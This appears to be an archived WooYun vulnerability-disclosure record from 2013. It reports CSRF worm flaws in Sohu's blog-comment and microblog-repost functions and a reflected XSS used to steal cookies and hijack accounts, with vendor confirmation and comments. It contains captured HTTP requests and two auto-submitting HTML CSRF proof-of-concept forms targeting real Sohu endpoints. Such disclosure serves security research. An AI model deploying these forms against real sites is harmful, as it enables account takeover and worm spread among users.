{"id": 12013, "wybug_id": "wooyun-2013-023269", "wybug_title": "搜狐微博csrf蠕虫&amp;利用xss劫持微博帐号", "wybug_corp": "搜狐", "wybug_author": "se55i0n", "wybug_date": "2013-05-08 12:48", "wybug_open_date": "2013-06-22 12:49", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "应用配置错误", "利用技巧", "绕过", "类型应用", "漏洞利用", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-22：\t细节向公众公开  简要描述： 搜狐的大锅，说好的礼物呢？发个洞子提醒下，话说是不是该落实下礼物咯：D 详细说明：  1）csrf蠕虫11.1）问题i.sohu.com评论功能上，见下图；\n\n1.2）点击评论并抓包，得到数据如下；\nPOST /a/app/discuss/save.htm?_input_encode=UTF-8&_=ajeglyxpsf HTTP/1.1Host: i.sohu.comProxy-Connection: keep-aliveContent-Length: 61Origin: http://i.sohu.comUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31Content-Type: application/x-www-form-urlencodedAccept: */*Referer: http://i.sohu.com/p/=v2=aaBh5ULzWW9pVYYtpmNvbQ==/blog/view/260587564.htmAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: ...type=0&discusstype=1&appid=blog&itemid=260587564&content=test\n1.3）测试了下，这里未校验referer、无token，例子POC如下；\n<html><body><form id=\"se55i0n\" name=\"se55i0n\" action=\"http://i.sohu.com/a/app/discuss/save.htm?_input_encode=UTF-8\" method=\"POST\"><input type=\"hidden\" name=\"type\" value=\"0\" /><input type=\"hidden\" name=\"discusstype\" value=\"1\" /><input type=\"hidden\" name=\"appid\" value=\"blog\" /><input type=\"hidden\" name=\"itemid\" value=\"260587564\" /><input type=\"hidden\" name=\"content\" value=\"test\" /><input type=\"submit\" value=\"submit\" /></form><script>   document.se55i0n.submit();</script></body></html>\n1.4）这里还能GET方式提交请求，并且会泄露被评论博客用户的个人搜狐帐号信息；\n\n1.5）提交成功后，会转发一条微博；\n\n2）csrf蠕虫22.1）问题出在微博的新功能上，如下图；\n\n2.2）发表一条微博，发现旁边有个“+2”的功能，点击并抓包得到数据如下；\nPOST /twAction/reTwitter HTTP/1.1Host: t.sohu.comProxy-Connection: keep-aliveContent-Length: 68Accept: application/json, text/javascript, */*; q=0.01Origin: http://t.sohu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31Content-Type: application/x-www-form-urlencodedReferer: http://t.sohu.com/Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: ...msgid=8205603065&content=&#43;2&type=&at=8205603065&msg=%26%2343%3B2\n2.3）\"msgid\"对应了转发的微博，content为内容“+2”（这里内容能够我们能够控制），测试发现未校验referer，未加入token，so；\n<html><body><form id=\"se55i0n\" name=\"se55i0n\" action=\"http://t.sohu.com/twAction/reTwitter\" method=\"POST\"><input type=\"hidden\" name=\"msgid\" value=\"8205603065\" /><input type=\"hidden\" name=\"content\" value=\"test\" /><input type=\"hidden\" name=\"at\" value=\"8205603065\" /><input type=\"hidden\" name=\"msg\" value=\"test\" /><input type=\"submit\" value=\"submit\" /></form><script>   document.se55i0n.submit();</script></body></html>\n2.4）使用另一个帐号登录并运行该POC效果如下；\n\n2.5）返回微博查看效果；\n\n3）利用sohu.com下某处发射型xss劫持微博3.1）问题所在：http://register.mail.sohu.com/servlet/getUnreadMailCountServlet?callback=...3.2)仅仅测试了FF下的效果；\n\n3.3）利用se55i0n微博帐号测试下，能够得到cookie；\n\n3.4）利用获取到cookie，成功登录微博帐号；\n\nPS：当然xss和csrf还能双剑合璧，效果更好，哈哈！一次发这么多，大锅，礼物呀！！！   漏洞证明：  见详细说明   修复方案：  你们懂的！   版权声明：转载请注明来源 se55i0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-05-09 12:53 厂商回复： 感谢对搜狐安全的关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-08 13:19 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  关注    \n     2013-05-15 19:18 |    \t\tx1aoh4i \t\t\t( 普通白帽子  |\t\t\t        Rank:403 漏洞数:62        )\t\t \n  将来的二哥    \n     2013-06-08 21:00 |    \t\t风之传说 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:28        | 借用朋友的一句话，你的时间在哪里，你的成...)\t\t \n  不错不错。。。    \n     2013-06-22 17:18 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:54        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  还是看得懂一些的·····    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}